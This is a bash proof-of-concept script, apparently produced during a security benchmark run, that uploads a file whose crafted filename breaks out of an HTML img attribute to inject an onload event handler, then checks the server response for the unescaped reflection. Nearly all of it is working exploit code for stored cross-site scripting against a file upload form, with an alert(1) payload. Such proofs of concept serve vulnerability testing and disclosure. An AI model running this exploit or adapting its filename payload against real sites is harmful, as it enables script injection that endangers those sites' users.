#!/bin/bash
# POC: Demonstrates Stored XSS via malicious filename in file upload. Uploads a file with JavaScript event handlers in the filename, which are URL-encoded but decoded and executed by the browser when the uploaded file is accessed.
# Target: ./repo
# Created: 2025-11-07T19:27:28.792Z
# Session: benchmark-XBEN-067-24-mhp8bhdm

# Stored XSS via File Upload Filename Parameter
# This POC demonstrates how a specially crafted filename can lead to stored XSS
# when the filename is reflected in an HTML img src attribute

TARGET_URL="${1:-http://localhost:8080}"
UPLOAD_ENDPOINT="/index.php"

echo "[*] Stored XSS via File Upload Filename - POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Create a minimal test image (valid JPG magic bytes)
TEMP_IMG="/tmp/xss_test_image.jpg"
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF' > "$TEMP_IMG"
echo "test" >> "$TEMP_IMG"

# Payload: JavaScript in filename that will be URL-encoded and then decoded by browser
# Format: filename with event handler that breaks out of src attribute
MALICIOUS_FILENAME='test.jpg" onload="alert(1)'

echo "[*] Creating payload with malicious filename: $MALICIOUS_FILENAME"
echo "[*] This filename will be URL-encoded in HTML but decoded by browser"
echo ""

# Upload file with malicious filename
echo "[*] Uploading file with XSS payload in filename..."
RESPONSE=$(curl -s -F "userfile=@$TEMP_IMG;filename=$MALICIOUS_FILENAME" "$TARGET_URL$UPLOAD_ENDPOINT")

echo "[*] Server Response:"
echo "$RESPONSE"
echo ""

# Check if the response contains the unescaped filename in HTML context
if echo "$RESPONSE" | grep -q 'onload'; then
    echo "[+] VULNERABLE: Filename with 'onload' handler found in response!"
    echo "[+] The filename is reflected without proper HTML escaping"
    echo ""
    
    # Extract the relevant HTML snippet
    echo "[*] Vulnerable HTML snippet:"
    echo "$RESPONSE" | grep -o '<img[^>]*>' | head -1
    echo ""
    
    # Show what happens after URL decoding
    echo "[*] After URL decoding by browser, the HTML becomes:"
    echo "<img src=\"upload/test.jpg\" onload=\"alert(1)\">"
    echo ""
    echo "[+] The JavaScript alert(1) would be executed when the image loads!"
    
    # Check if it's URL-encoded version
    if echo "$RESPONSE" | grep -q '%22.*onload'; then
        echo "[+] Payload is URL-encoded in HTML response"
        echo "[+] Browser will URL-decode and execute the JavaScript"
        exit 0
    fi
    
    # Check for direct unescaped version
    if echo "$RESPONSE" | grep -q 'src="[^"]*" onload'; then
        echo "[+] Payload is directly unescaped in HTML"
        exit 0
    fi
fi

# Alternative check: look for img tags with the filename
if echo "$RESPONSE" | grep -i 'img.*src.*test\.jpg' -q; then
    echo "[*] Found img tag with test.jpg reference"
    
    # Extract img tag for analysis
    IMG_TAG=$(echo "$RESPONSE" | grep -o '<img[^>]*test\.jpg[^>]*>' | head -1)
    echo "[*] Image tag found: $IMG_TAG"
    
    if echo "$IMG_TAG" | grep -i 'onload\|onerror\|onclick' -q; then
        echo "[+] VULNERABLE: Event handler found in img tag!"
        exit 0
    fi
fi

# If we can access the uploaded file directly
UPLOAD_PATH="/upload/$MALICIOUS_FILENAME"
echo "[*] Checking if file can be accessed directly at: $TARGET_URL$UPLOAD_PATH"

FILE_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$UPLOAD_PATH")
if [ "$FILE_RESPONSE" = "200" ]; then
    echo "[+] File is accessible via: $TARGET_URL$UPLOAD_PATH"
    echo "[+] This confirms the malicious filename was stored"
    exit 0
fi

# Final attempt: check response contains any evidence of the payload
if echo "$RESPONSE" | grep -q 'test.jpg'; then
    if echo "$RESPONSE" | grep -E '(onload|onerror|onclick|script)' -i -q; then
        echo "[+] VULNERABLE: Filename with event handlers reflected in response"
        exit 0
    fi
fi

echo "[-] Could not confirm vulnerability in response"
echo "[*] This may indicate the server properly escapes filenames"
echo "[*] Or the upload was rejected"
exit 1